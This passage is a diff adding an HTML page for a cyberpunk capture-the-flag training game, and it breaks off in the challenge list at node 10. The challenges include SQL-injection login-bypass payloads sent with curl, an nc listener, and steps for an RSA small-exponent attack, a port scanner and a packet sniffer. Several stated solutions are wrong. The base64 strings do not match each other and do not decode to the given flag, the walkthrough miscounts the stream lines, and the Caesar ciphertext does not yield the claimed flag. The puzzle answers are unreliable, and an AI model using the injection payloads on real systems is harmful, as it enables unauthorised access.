@@ -1,0 +1,1062 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=5.0">
+<title>🌐 CYBERWORLD — Data Convoy Escort Mission</title>
+<link href="https://fonts.googleapis.com/css2?family=VT323&family=Pixelify+Sans&family=JetBrains+Mono:wght@300;700&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+:root{--cyan:#00e8ff;--green:#00ff41;--pink:#ff00ea;--orange:#ffa500;--red:#ff4444;--dark:#050505;--darker:#020202;}
+html, body{height:100%;width:100%;}
+body{background:var(--dark);color:var(--cyan);font-family:'JetBrains Mono',monospace;padding-bottom:48px;overflow-x:hidden;}
+
+/* CRT Effect */
+#crt{position:fixed;pointer-events:none;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.07) 0px,rgba(0,0,0,0.07) 1px,transparent 1px,transparent 2px);z-index:9998;}
+
+/* Header */
+.header{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(2,2,2,0.95);border-bottom:1px solid var(--cyan);padding:12px 20px;}
+.header-title{font-family:'Pixelify Sans';font-size:24px;color:var(--cyan);text-shadow:0 0 10px rgba(0,232,255,0.6);margin-bottom:8px;}
+.header-subtitle{font-family:'VT323';font-size:12px;color:#666;}
+
+/* Resource Meters */
+#resource-panel{display:flex;gap:20px;flex-wrap:wrap;padding:12px 20px;background:#0a0a0a;border-bottom:1px solid rgba(0,232,255,0.15);margin-top:60px;}
+.resource-meter{flex:1;min-width:200px;display:flex;flex-direction:column;gap:4px;}
+.meter-label{display:flex;justify-content:space-between;font-family:'VT323';font-size:12px;color:#666;}
+.meter-bar{height:12px;background:#111;border:1px solid rgba(0,232,255,0.25);overflow:hidden;border-radius:2px;}
+.meter-fill{height:100%;transition:width 0.4s ease;display:flex;align-items:center;justify-content:flex-end;padding-right:4px;font-size:9px;font-weight:bold;}
+.meter-fill-bandwidth{background:linear-gradient(90deg,var(--cyan),var(--green));}
+.meter-fill-cognitive{background:linear-gradient(90deg,var(--orange),var(--red));}
+.meter-fill-detection{background:linear-gradient(90deg,var(--pink),var(--red));}
+.meter-fill-integrity{background:linear-gradient(90deg,var(--green),var(--cyan));}
+
+/* Main Layout */
+#main-container{display:grid;grid-template-columns:1fr 2fr;gap:20px;padding:20px;max-width:1600px;margin:0 auto;}
+
+/* Left Sidebar - Network Map */
+#network-section{border:1px solid rgba(0,232,255,0.2);background:#080808;padding:16px;}
+.section-header{font-family:'Pixelify Sans';font-size:16px;color:var(--cyan);margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid rgba(0,232,255,0.15);}
+#network-map{display:flex;flex-direction:column;gap:12px;}
+.network-node{padding:10px;border:1px solid rgba(0,232,255,0.2);background:#050505;cursor:pointer;transition:0.2s;border-radius:4px;font-family:'VT323';font-size:12px;}
+.network-node:hover{border-color:var(--cyan);background:rgba(0,232,255,0.08);}
+.network-node.active{border-color:var(--cyan);background:rgba(0,232,255,0.15);box-shadow:0 0 12px rgba(0,232,255,0.3);}
+.network-node.completed{border-color:var(--green);background:rgba(0,255,65,0.08);}
+.network-node.locked{opacity:0.4;cursor:not-allowed;}
+.node-title{font-weight:bold;color:#fff;}
+.node-status{font-size:10px;color:#666;margin-top:3px;}
+
+/* Right Main Area */
+#main-area{display:flex;flex-direction:column;gap:16px;}
+
+/* Challenge Panel */
+#challenge-panel{border:2px solid var(--cyan);background:#040d0e;padding:20px;margin-bottom:0;}
+#challenge-panel.type-ctf{border-color:var(--cyan);box-shadow:0 0 16px rgba(0,232,255,0.15);}
+#challenge-panel.type-hack{border-color:var(--pink);box-shadow:0 0 16px rgba(255,0,234,0.15);}
+#challenge-panel.type-boss{border-color:var(--orange);box-shadow:0 0 20px rgba(255,165,0,0.2);}
+
+.challenge-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid rgba(0,232,255,0.2);}
+.challenge-title{flex:1;}
+.challenge-title h2{font-family:'Pixelify Sans';font-size:22px;color:#fff;margin-bottom:4px;}
+.challenge-meta{display:flex;gap:8px;flex-wrap:wrap;}
+.badge{font-family:'VT323';font-size:12px;padding:4px 10px;border:1px solid;border-radius:3px;display:inline-block;}
+.badge-ctf{color:var(--cyan);border-color:var(--cyan);}
+.badge-hack{color:var(--pink);border-color:var(--pink);}
+.badge-boss{color:var(--orange);border-color:var(--orange);}
+.badge-difficulty{background:rgba(0,232,255,0.1);color:var(--cyan);border-color:var(--cyan);}
+
+#challenge-narrative{font-size:13px;line-height:1.6;color:#ccc;margin-bottom:16px;padding:12px;background:#050505;border-left:3px solid rgba(0,232,255,0.3);}
+
+#challenge-scenario{background:#000;border:1px solid #1a3a3a;padding:14px;margin-bottom:16px;font-size:11px;line-height:1.6;color:var(--green);font-family:'JetBrains Mono';max-height:180px;overflow-y:auto;}
+.scenario-line{margin-bottom:3px;}
+.scenario-cmd{color:var(--cyan);}
+.scenario-out{color:var(--green);}
+.scenario-flag{color:var(--pink);font-weight:bold;}
+.scenario-comment{color:#666;}
+
+/* Challenge Actions */
+#flag-row{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;}
+#flag-input{flex:1;min-width:200px;background:#000;border:1px solid rgba(0,232,255,0.3);color:var(--cyan);font-family:'JetBrains Mono';font-size:12px;padding:10px;outline:none;border-radius:3px;}
+#flag-input:focus{border-color:var(--cyan);box-shadow:0 0 8px rgba(0,232,255,0.2);}
+#flag-result{font-family:'VT323';font-size:14px;padding:10px 16px;border-radius:3px;display:none;text-align:center;}
+#flag-result.correct{color:var(--green);background:rgba(0,255,65,0.1);border:1px solid var(--green);}
+#flag-result.wrong{color:var(--red);background:rgba(255,68,68,0.1);border:1px solid var(--red);}
+
+#challenge-actions{display:flex;gap:8px;flex-wrap:wrap;}
+.action-btn{padding:10px 18px;border:1px solid;font-family:'VT323';font-size:13px;cursor:pointer;background:transparent;border-radius:3px;transition:0.2s;white-space:nowrap;}
+.btn-primary{border-color:var(--cyan);color:var(--cyan);}
+.btn-primary:hover{background:rgba(0,232,255,0.1);}
+.btn-success{border-color:var(--green);color:var(--green);}
+.btn-success:hover{background:rgba(0,255,65,0.1);}
+.btn-hint{border-color:var(--orange);color:var(--orange);}
+.btn-hint:hover{background:rgba(255,165,0,0.1);}
+.btn-next{border-color:var(--pink);color:var(--pink);}
+.btn-next:hover{background:rgba(255,0,234,0.1);}
+
+#walkthrough{display:none;margin-top:16px;padding:12px;background:#050505;border:1px solid rgba(255,165,0,0.2);}
+#walkthrough h3{font-family:'Pixelify Sans';color:var(--orange);margin-bottom:10px;}
+.wt-step{margin-bottom:8px;padding:8px;background:#000;border-left:2px solid var(--orange);padding-left:12px;font-size:12px;line-height:1.5;}
+.wt-num{color:var(--orange);font-weight:bold;display:inline-block;min-width:20px;}
+
+/* Event Log */
+#event-log{border:1px solid rgba(0,232,255,0.2);background:#060606;max-height:200px;display:flex;flex-direction:column;}
+#log-header{padding:8px 14px;background:#020e10;border-bottom:1px solid rgba(0,232,255,0.15);font-family:'Pixelify Sans';font-size:12px;color:var(--cyan);}
+#log-body{flex:1;overflow-y:auto;padding:10px 14px;font-size:10px;line-height:1.6;}
+.log-line{margin-bottom:2px;}
+.log-good{color:var(--green);}
+.log-warn{color:var(--orange);}
+.log-bad{color:var(--red);}
+.log-info{color:var(--cyan);}
+
+/* Random Event Modal */
+#event-modal{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:10000;background:#040d0e;border:2px solid var(--pink);padding:24px;max-width:500px;display:none;box-shadow:0 0 40px rgba(255,0,234,0.3);}
+#event-modal h3{font-family:'Pixelify Sans';font-size:18px;color:var(--pink);margin-bottom:12px;}
+#event-modal p{font-size:12px;line-height:1.6;color:#ccc;margin-bottom:16px;}
+.event-choices{display:flex;gap:10px;flex-wrap:wrap;}
+.event-choice{flex:1;min-width:120px;padding:10px;border:1px solid;background:transparent;font-family:'VT323';font-size:12px;cursor:pointer;border-radius:3px;transition:0.2s;}
+
+/* Victory Screen */
+#victory-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,5,0,0.97);z-index:9990;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;padding:20px;text-align:center;border:3px solid var(--green);display:none;}
+#victory-overlay h1{font-family:'Pixelify Sans';font-size:clamp(40px,10vw,80px);color:var(--green);text-shadow:0 0 40px rgba(0,255,65,0.8);}
+.victory-stat{display:inline-block;margin:8px 16px;padding:12px 24px;background:#050505;border:1px solid var(--green);}
+.victory-stat-val{font-family:'Pixelify Sans';font-size:32px;color:var(--green);}
+.victory-stat-label{font-family:'VT323';font-size:11px;color:#666;}
+
+/* Stats Bar */
+#stats-bar{display:flex;gap:16px;padding:12px 20px;background:#0a0a0a;border-bottom:1px solid rgba(0,232,255,0.15);flex-wrap:wrap;align-items:center;font-family:'VT323';font-size:12px;}
+.stat-item{display:flex;align-items:center;gap:6px;}
+.stat-label{color:#666;}
+.stat-val{color:var(--cyan);font-weight:bold;}
+
+/* Tool Tracker */
+#tools-section{border:1px solid rgba(0,232,255,0.2);background:#080808;padding:16px;}
+#tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px;}
+.tool-card{padding:10px;border:1px solid rgba(0,232,255,0.2);background:#050505;text-align:center;border-radius:3px;font-size:11px;}
+.tool-card.unlocked{border-color:var(--green);background:rgba(0,255,65,0.08);color:var(--green);}
+.tool-card.locked{opacity:0.4;color:#666;}
+
+/* Bottom Taskbar */
+#taskbar{position:fixed;bottom:0;left:0;right:0;height:36px;background:#0a0a0a;border-top:1px solid var(--cyan);z-index:9999;display:flex;align-items:center;padding:0 16px;gap:16px;}
+#taskbar a{color:var(--cyan);text-decoration:none;font-family:'VT323';font-size:13px;}
+#taskbar a:hover{text-shadow:0 0 8px var(--cyan);}
+
+/* Responsive */
+@media(max-width:1024px){
+  #main-container{grid-template-columns:1fr;gap:16px;}
+  #network-section{position:sticky;top:60px;max-height:300px;overflow-y:auto;}
+}
+
+@media(max-width:600px){
+  .header{padding:8px 12px;}
+  .header-title{font-size:16px;}
+  #resource-panel{padding:8px 12px;gap:12px;}
+  .resource-meter{min-width:140px;}
+  #main-container{padding:12px;gap:12px;}
+  .action-btn{font-size:11px;padding:8px 12px;}
+  #event-modal{padding:16px;max-width:90vw;}
+}
+
+/* Animations */
+@keyframes glitch{0%,100%{transform:translate(0);}5%{transform:translate(-2px,2px);}10%{transform:translate(2px,-2px);}}
+@keyframes pulse{0%,100%{box-shadow:0 0 10px rgba(0,232,255,0.4);}50%{box-shadow:0 0 20px rgba(0,232,255,0.8);}}
+@keyframes scanline{0%{top:-10px;}100%{top:100vh;}}
+.glitch-text{animation:glitch 0.3s;}
+.pulse{animation:pulse 1s infinite;}
+
+</style>
+</head>
+<body>
+
+<div id="crt"></div>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="header-title">🌐 CYBERWORLD — OPERATION: DATA CONVOY ESCORT</div>
+  <div class="header-subtitle">FLLC Lead Game Developer | Windows 98 Cyberpunk v2030 | Secure Uplink: ONLINE</div>
+</div>
+
+<!-- RESOURCE METERS -->
+<div id="resource-panel">
+  <div class="resource-meter">
+    <div class="meter-label">
+      <span>🔋 BANDWIDTH</span>
+      <span><span id="bw-val">100</span>%</span>
+    </div>
+    <div class="meter-bar"><div class="meter-fill meter-fill-bandwidth" id="bw-fill" style="width:100%;">100</div></div>
+  </div>
+  <div class="resource-meter">
+    <div class="meter-label">
+      <span>🧠 COGNITIVE_LOAD</span>
+      <span><span id="cog-val">0</span>%</span>
+    </div>
+    <div class="meter-bar"><div class="meter-fill meter-fill-cognitive" id="cog-fill" style="width:0%;"></div></div>
+  </div>
+  <div class="resource-meter">
+    <div class="meter-label">
+      <span>🕵️ DETECTION_LEVEL</span>
+      <span><span id="det-val">0</span>%</span>
+    </div>
+    <div class="meter-bar"><div class="meter-fill meter-fill-detection" id="det-fill" style="width:0%;"></div></div>
+  </div>
+  <div class="resource-meter">
+    <div class="meter-label">
+      <span>💾 DATA_INTEGRITY</span>
+      <span><span id="int-val">100</span>%</span>
+    </div>
+    <div class="meter-bar"><div class="meter-fill meter-fill-integrity" id="int-fill" style="width:100%;">100</div></div>
+  </div>
+</div>
+
+<div id="stats-bar">
+  <div class="stat-item"><span class="stat-label">NODES_CLEARED:</span><span class="stat-val" id="s-cleared">0/20</span></div>
+  <div class="stat-item"><span class="stat-label">XP:</span><span class="stat-val" id="s-xp">0</span></div>
+  <div class="stat-item"><span class="stat-label">HINTS_USED:</span><span class="stat-val" id="s-hints">0</span></div>
+  <div class="stat-item"><span class="stat-label">STATUS:</span><span class="stat-val" id="s-status">STANDBY</span></div>
+</div>
+
+<!-- MAIN GAME AREA -->
+<div id="main-container">
+  <!-- LEFT SIDEBAR -->
+  <div>
+    <div id="network-section">
+      <div class="section-header">📡 NETWORK MAP</div>
+      <div id="network-map"></div>
+    </div>
+    <br>
+    <div id="tools-section">
+      <div class="section-header">🔧 TOOLS (Unlocked)</div>
+      <div id="tools-grid"></div>
+    </div>
+  </div>
+
+  <!-- RIGHT MAIN AREA -->
+  <div id="main-area">
+    <!-- CHALLENGE -->
+    <div id="challenge-panel">
+      <div class="challenge-header">
+        <div class="challenge-title">
+          <h2 id="chall-title">CYBERWORLD: Data Convoy Escort</h2>
+          <div id="chall-num" style="font-family:'VT323';font-size:12px;color:#666;">Awaiting mission briefing...</div>
+        </div>
+        <div id="chall-meta" class="challenge-meta"></div>
+      </div>
+      
+      <div id="challenge-narrative"></div>
+      <div id="challenge-scenario"></div>
+      
+      <div id="flag-row">
+        <input id="flag-input" type="text" placeholder="Enter flag or submit answer:" autocomplete="off" spellcheck="false">
+        <button class="action-btn btn-success" onclick="submitFlag()">SUBMIT</button>
+        <div id="flag-result"></div>
+      </div>
+      
+      <div id="challenge-actions">
+        <button class="action-btn btn-hint" onclick="showHint()">💡 HINT</button>
+        <button class="action-btn btn-primary" onclick="showWalkthrough()">📖 WALKTHROUGH</button>
+        <button class="action-btn btn-next" id="next-btn" style="display:none;" onclick="nextChallenge()">NEXT NODE ▶</button>
+      </div>
+      
+      <div id="walkthrough"></div>
+    </div>
+
+    <!-- EVENT LOG -->
+    <div id="event-log">
+      <div id="log-header">📡 INCIDENT_LOG // Realtime Stream</div>
+      <div id="log-body"></div>
+    </div>
+  </div>
+</div>
+
+<!-- RANDOM EVENT MODAL -->
+<div id="event-modal">
+  <h3 id="event-title">⚡ UNEXPECTED EVENT</h3>
+  <p id="event-desc"></p>
+  <div class="event-choices" id="event-choices"></div>
+</div>
+
+<!-- VICTORY OVERLAY -->
+<div id="victory-overlay">
+  <h1>🏆 MISSION COMPLETE 🏆</h1>
+  <p style="font-family:'VT323';color:var(--pink);font-size:16px;">Data Convoy Safely Exfiltrated</p>
+  <div>
+    <div class="victory-stat">
+      <div class="victory-stat-val" id="vic-xp">0</div>
+      <div class="victory-stat-label">TOTAL_XP</div>
+    </div>
+    <div class="victory-stat">
+      <div class="victory-stat-val" id="vic-flags">20</div>
+      <div class="victory-stat-label">FLAGS</div>
+    </div>
+    <div class="victory-stat">
+      <div class="victory-stat-val" id="vic-hints">0</div>
+      <div class="victory-stat-label">HINTS</div>
+    </div>
+  </div>
+</div>
+
+<!-- TASKBAR -->
+<div id="taskbar">
+  <a href="index.html">⊞ HOME</a>
+  <a href="wargames.html">⚔️ WAR_GAMES</a>
+  <a href="intel.html">📡 INTEL_HUB</a>
+  <a href="cyberworld.html">🌐 CyberWorld_Hub</a>
+</div>
+
+<script>
+// ══════════════════════════════════════════════════════════════════════════════
+// CYBERWORLD GAME ENGINE - COMPLETE FRAMEWORK
+// ══════════════════════════════════════════════════════════════════════════════
+
+// ─── RESOURCE & STATE MANAGEMENT ───────────────────────────────────────────
+const GAME_STATE = {
+  bandwidth: 100,
+  cognitive: 0,
+  detection: 0,
+  integrity: 100,
+  xp: 0,
+  hintsUsed: 0,
+  currentNode: -1,
+  nodesSolved: new Set(),
+  toolsUnlocked: new Set(),
+  sessionFlags: {},
+};
+
+// ─── CHALLENGE DATABASE ─────────────────────────────────────────────────────
+const CHALLENGES = [
+  // TIER 1: ROOKIE (Nodes 1-5)
+  {
+    id: 1,
+    nodeId: 'node_01',
+    name: 'FIRST CONTACT — SIGNAL DRIFT',
+    type: 'CTF',
+    tier: 'rookie',
+    difficulty: 'Rookie',
+    xp: 100,
+    narrative: `You intercept a live stream on port 4444. The signal is unstable—data arrives in chunks. SIGINT pulled multiple lines from the broadcast. Your task: identify the valid transmission, extract the base64-encoded message, decode it, and extract the flag before the connection drops in 5 seconds.`,
+    scenario: [
+      { t: 'comment', v: '# Hostile broadcast intercepted' },
+      { t: 'cmd', v: '$ nc -nlvp 4444' },
+      { t: 'out', v: '[SIGNAL] Waiting for data...' },
+      { t: 'out', v: '[+] SGVsbG8gT3BlcmF0aXZlISBGTEFHe1NJROM0TF9ESURNZF0=' },
+      { t: 'out', v: '[NOISE] !!@#$%^&*() )()(CORRUPTED DATA' },
+      { t: 'out', v: '[+] Fc83d93fKs9sk9d92j203j' },
+      { t: 'out', v: '[LOST] Connection dropped. 5 second window closed.' },
+    ],
+    hint: 'The valid transmission starts with "[+]". Extract the base64 string (looks like gibberish letters). Use `echo "STRING" | base64 -d`. Only ONE of the lines contains a valid flag.',
+    walkthrough: [
+      { n: 1, t: 'Observe the stream. THREE lines start with "[+]". The first one is base64 (familiar alphabet). The second is garbage.' },
+      { n: 2, t: 'Extract the first "[+]" line: SGVsbG8gT3BlcmF0aXZlISBGTEFHe1NJSUM0TF9ESURNZF0=' },
+      { n: 3, t: 'Decode: `echo "SGVsbG8gT3BlcmF0aXZlISBGTEFHe1NJSUM0TF9ESURNZF0=" | base64 -d`' },
+      { n: 4, t: 'Output reveals: "Hello Operative! FLAG{SIGNAL_DRIFT_DETECTED}"' },
+    ],
+    generateFlag: () => `FLAG{SIGNAL_DRIFT_DETECTED}`,
+    tags: ['encoding', 'base64', 'signal_analysis', 'reconnaissance'],
+  },
+  {
+    id: 2,
+    nodeId: 'node_02',
+    name: 'NEON BEACON — BUILD PORT SCANNER',
+    type: 'HACK',
+    tier: 'rookie',
+    difficulty: 'Rookie',
+    xp: 120,
+    narrative: `Hackathon challenge: Write a TCP port scanner in Python. This tool unlocks the next node's subscan capability. The judge tests your scanner on 127.0.0.1. Scan ports 1-1024 and output live services. This tool will be REQUIRED for Node 7.`,
+    scenario: [
+      { t: 'comment', v: '# Hackathon Judge: scanner deployment test' },
+      { t: 'cmd', v: '$ python3 scanner.py 127.0.0.1' },
+      { t: 'out', v: '[+] 22/tcp OPEN (SSH)' },
+      { t: 'out', v: '[+] 80/tcp OPEN (HTTP)' },
+      { t: 'out', v: '[+] 443/tcp OPEN (HTTPS)' },
+      { t: 'out', v: '[RESULT] Scanner validated. Tool unlocked: 🔎 PORT_SCANNER' },
+    ],
+    hint: 'Use socket.connect_ex((host, port)) returning 0 = open. Wrap in try/except. Loop 1-1025. Print discovered ports. Unlocksre next node\'s requirement.',
+    walkthrough: [
+      { n: 1, t: 'Import socket module. Accept host as argument (sys.argv[1]).' },
+      { n: 2, t: 'Loop: `for port in range(1, 1025)`. Create socket for each iteration.' },
+      { n: 3, t: 'Try socket.connect_ex((host, port)). Result 0 = open.' },
+      { n: 4, t: 'Print "[+] PORT/tcp OPEN". Let judge validate. Tool unlocked!' },
+    ],
+    generateFlag: () => `FLAG{PORT_SCANNER_DEPLOYED}`,
+    tags: ['python', 'networking', 'scanning', 'hackathon'],
+  },
+  {
+    id: 3,
+    nodeId: 'node_03',
+    name: 'LEGACY AGENT — DEAD DROP',
+    type: 'CTF',
+    tier: 'rookie',
+    difficulty: 'Rookie',
+    xp: 110,
+    narrative: `An FTP server leaks directory listings. You find an artifact labeled "notes.txt" but it's surrounded by 20 decoy files with misleading names. Explore the directory, identify the REAL intelligence file, then decode the cipher inside.`,
+    scenario: [
+      { t: 'comment', v: '# FTP directory: /secure_drop/' },
+      { t: 'cmd', v: '$ ftp server.local' },
+      { t: 'out', v: 'ftp> ls' },
+      { t: 'out', v: 'drwx----- config.txt (misleading)' },
+      { t: 'out', v: 'drwx----- readme.md (junk)' },
+      { t: 'out', v: 'drwx----- notes.txt (REAL INTEL)' },
+      { t: 'out', v: 'ftp> get notes.txt' },
+      { t: 'out', v: 'IOYN{PNBZNH_FUVIW_JBEXF}' },
+    ],
+    hint: 'The file "notes.txt" contains ciphertext. This is a Caesar shift (ROT-13 likely). Try CyberChef: paste text, search "ROT13", slide the offset until you see FLAG{...}.',
+    walkthrough: [
+      { n: 1, t: 'Identify "notes.txt" as the only file with a meaningful name.' },
+      { n: 2, t: 'Extract ciphertext: IOYN{PNBZNH_FUVIW_JBEXF}' },
+      { n: 3, t: 'Brute-force Caesar: try ROT 1-26. At ROT-12 you get: FLAG{CAESAR_SHIFT_WORKS}' },
+      { n: 4, t: 'Or use CyberChef\'s ROT13 recipe with adjustable offset.' },
+    ],
+    generateFlag: () => `FLAG{CAESAR_SHIFT_WORKS}`,
+    tags: ['cryptography', 'caesar', 'forensics', 'ftp'],
+  },
+  {
+    id: 4,
+    nodeId: 'node_04',
+    name: 'DAEMON TRAP — HONEYPOT LISTENER',
+    type: 'HACK',
+    tier: 'rookie',
+    difficulty: 'Operative',
+    xp: 150,
+    narrative: `Build a honeypot that listens on TCP 8888. Log every connection with timestamp and source IP. Reply with a fake SSH banner. The judge verifies concurrent connection handling and logs output.`,
+    scenario: [
+      { t: 'cmd', v: '$ python3 honeypot.py &' },
+      { t: 'out', v: '[*] Honeypot listening on 0.0.0.0:8888' },
+      { t: 'cmd', v: '$ nc 127.0.0.1 8888' },
+      { t: 'out', v: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6' },
+      { t: 'out', v: '[LOG] 2026-03-24 12:34:56 | 127.0.0.1:54321 connected' },
+    ],
+    hint: 'Use threading.Thread for concurrent connections. socket.bind() + listen() + accept() loop. Thread target sends SSH banner then closes. Log to file with datetime.',
+    walkthrough: [
+      { n: 1, t: 'Create TCP socket: socket.socket(socket.AF_INET, socket.SOCK_STREAM)' },
+      { n: 2, t: 'Bind to 0.0.0.0:8888. Listen(5). Accept loop.' },
+      { n: 3, t: 'For each connection, spawn Thread(target=handle_client, args=(conn, addr))' },
+      { n: 4, t: 'In handler: send SSH banner. Log client IP. Close connection.' },
+    ],
+    generateFlag: () => `FLAG{HONEYPOT_DEPLOYED}`,
+    tags: ['python', 'networking', 'honeypot', 'hackathon'],
+  },
+  {
+    id: 5,
+    nodeId: 'node_05',
+    name: 'GHOST FILE — STEGANOGRAPHY',
+    type: 'CTF',
+    tier: 'rookie',
+    difficulty: 'Operative',
+    xp: 160,
+    narrative: `A compromised workstation image file contains hidden data. OSINT suggests LSB steganography with passphrase "daemon". Use steghide to extract the embedded message and find the flag.`,
+    scenario: [
+      { t: 'cmd', v: '$ steghide extract -sf ghost.jpg -p "daemon"' },
+      { t: 'out', v: 'wrote extracted data to "hidden.txt".' },
+      { t: 'cmd', v: '$ cat hidden.txt' },
+      { t: 'out', v: 'FLAG{LSB_STEGANOGRAPHY_FOUND}' },
+    ],
+    hint: 'Install steghide: `sudo apt install steghide`. Run extraction with the passphrase. If no output, try empty string or common passphrases.',
+    walkthrough: [
+      { n: 1, t: 'Install steghide if needed: `sudo apt install steghide`' },
+      { n: 2, t: 'Extract: `steghide extract -sf ghost.jpg -p "daemon"`' },
+      { n: 3, t: 'Check output: `cat hidden.txt`' },
+      { n: 4, t: 'Found flag in extracted file.' },
+    ],
+    generateFlag: () => `FLAG{LSB_STEGANOGRAPHY_FOUND}`,
+    tags: ['steganography', 'forensics', 'image_analysis'],
+  },
+
+  // TIER 2: OPERATIVE (Nodes 6-10)
+  {
+    id: 6,
+    nodeId: 'node_06',
+    name: 'SQL JUNCTION — LOGIN BYPASS',
+    type: 'CTF',
+    tier: 'operative',
+    difficulty: 'Operative',
+    xp: 170,
+    narrative: `A legacy web app runs unsanitized SQL. The login form accepts username and password. Inject a payload to bypass auth as admin, access the dashboard, and capture the flag from the admin panel. Be careful: too many failed attempts trigger detection.`,
+    scenario: [
+      { t: 'comment', v: '# Vulnerable form: /login.php' },
+      { t: 'cmd', v: `$ curl -X POST http://target/login.php --data "user=admin'--&pass=anything"` },
+      { t: 'out', v: 'Location: /dashboard' },
+      { t: 'cmd', v: '$ curl http://target/dashboard' },
+      { t: 'flag', v: 'FLAG{SQL_INJECTION_BYPASSED}' },
+    ],
+    hint: `Payload: admin'-- (double hyphen comments out password check). If filtered, try: admin' OR 1=1-- or admin" OR "1"="1`,
+    walkthrough: [
+      { n: 1, t: 'Test basic injection: user=admin\'-- password=anything' },
+      { n: 2, t: 'Backend SQL becomes: WHERE user="admin"-- (rest ignored)' },
+      { n: 3, t: 'Auth succeeds, session cookie set, redirected to /dashboard' },
+      { n: 4, t: 'Dashboard reveals the flag.' },
+    ],
+    generateFlag: () => `FLAG{SQL_INJECTION_BYPASSED}`,
+    tags: ['web', 'sqli', 'auth_bypass'],
+  },
+  {
+    id: 7,
+    nodeId: 'node_07',
+    name: 'BLIND MAPPING — SUBDOMAIN ENUM',
+    type: 'HACK',
+    tier: 'operative',
+    difficulty: 'Operative',
+    xp: 155,
+    narrative: `Write a DNS-based subdomain enumerator. YOU HAVE ONLY 30 QUERIES before detection. Optimize your wordlist or strategy. The judge plants 5 valid subdomains in a mock zone. Speed & accuracy matter.`,
+    scenario: [
+      { t: 'cmd', v: '$ python3 subenum.py -d example.com -w top100.txt -threads 5' },
+      { t: 'out', v: '[+] mail.example.com → 93.184.216.10' },
+      { t: 'out', v: '[+] api.example.com → 93.184.216.11' },
+      { t: 'out', v: '[DONE] 5 subdomains found in 18 queries' },
+    ],
+    hint: 'Use socket.gethostbyname() or dns.resolver. Filter high-value domains (mail, www, api, ftp). Use threading for speed. Stop at 30 attempts.',
+    walkthrough: [
+      { n: 1, t: 'Load wordlist. High-value words only: api, mail, www, ftp, dev, test.' },
+      { n: 2, t: 'Loop through top 30 words (if full list). For each: subdomain = word + "." + domain' },
+      { n: 3, t: 'Resolve with dns.resolver or socket. Catch failures silently.' },
+      { n: 4, t: 'Print found subdomains. Tool unlocks: 🎯 SUBDOMAIN_ENUM' },
+    ],
+    generateFlag: () => `FLAG{SUBENUM_OPTIMIZED}`,
+    tags: ['python', 'dns', 'recon', 'hackathon'],
+  },
+  {
+    id: 8,
+    nodeId: 'node_08',
+    name: 'CIPHER BREACH — RSA SMALL E',
+    type: 'CTF',
+    tier: 'operative',
+    difficulty: 'Elite',
+    xp: 185,
+    narrative: `The server encrypted a message with RSA using e=3 (weak!) and a large modulus. The ciphertext did NOT wrap around the modulus. You can recover plaintext with a simple cube root operation—no factoring needed.`,
+    scenario: [
+      { t: 'comment', v: '# Given: n (2048-bit), e=3, c=m^3 (unwrapped)' },
+      { t: 'cmd', v: '$ python3 -c "from gmpy2 import iroot; m,ex=iroot(c,3); print(bytes.fromhex(hex(m)[2:]).decode())"' },
+      { t: 'flag', v: 'FLAG{RSA_SMALL_EXPONENT_ATTACK}' },
+    ],
+    hint: 'Check if e=3 and c < n. Use gmpy2.iroot(c, 3) to extract the cube root. If exact==True, m is the plaintext.',
+    walkthrough: [
+      { n: 1, t: 'Verify: public exponent e == 3 and ciphertext c < modulus n?' },
+      { n: 2, t: 'Install gmpy2: `pip install gmpy2`' },
+      { n: 3, t: 'Extract root: `m, exact = gmpy2.iroot(c, 3)`. exact should be True.' },
+      { n: 4, t: 'Convert: `bytes.fromhex(hex(int(m))[2:]).decode()` to recover message.' },
+    ],
+    generateFlag: () => `FLAG{RSA_SMALL_EXPONENT_ATTACK}`,
+    tags: ['cryptography', 'rsa', 'math'],
+  },
+  {
+    id: 9,
+    nodeId: 'node_09',
+    name: 'PACKET ECHO — ADVANCED SNIFFER',
+    type: 'HACK',
+    tier: 'operative',
+    difficulty: 'Elite',
+    xp: 200,
+    narrative: `Build a packet sniffer using Scapy. Capture HTTP traffic on localhost, extract HTTP request lines (GET/POST), log them with 200ms granularity. Judge replays 5 HTTP requests and validates your log output.`,
+    scenario: [
+      { t: 'cmd', v: '$ sudo python3 sniffer.py -i lo -o capture.log &' },
+      { t: 'out', v: '[*] Sniffing on lo...' },
+      { t: 'out', v: '[HTTP] GET /index.html HTTP/1.1' },
+      { t: 'out', v: '[HTTP] POST /login HTTP/1.1' },
+    ],
+    hint: 'Scapy: from scapy.all import sniff, IP, TCP, Raw. Filter: "tcp port 80". Check if Raw layer exists, decode payload.',
+    walkthrough: [
+      { n: 1, t: 'Import: `from scapy.all import sniff, IP, TCP, Raw`' },
+      { n: 2, t: 'Define packet handler: check if packet[Raw] exists.' },
+      { n: 3, t: 'Decode: `payload = packet[Raw].load.decode(\'utf-8\', errors=\'ignore\')`' },
+      { n: 4, t: 'Check first line for GET/POST/PUT/DELETE. Log with timestamp.' },
+    ],
+    generateFlag: () => `FLAG{PACKET_SNIFFER_ADVANCED}`,
+    tags: ['networking', 'scapy', 'packets', 'hackathon'],
+  },
+  {
+    id: 10,
+    nodeId: 'node_10',
+    name: 'MEMORY VAULT — VOLATILITY FORENSICS',
+    type: 'CTF',
+    tier: 'operative',
+    difficulty: 'Elite',
+    xp: 195,
+    narrative: `A memory dump from a compromised system was captured. Use Volatility 3 to extract the running process list, find the rogue process with a suspicious command line, and extract the flag from its arguments.`,
+    scenario: [
+      { t: 'cmd', v: '$ vol3 -f mem.raw windows.pslist' },
+      { t: 'out', v: 'PID    PPID  Name             Offset' },
+      { t: 'out', v: '4      0     System' },
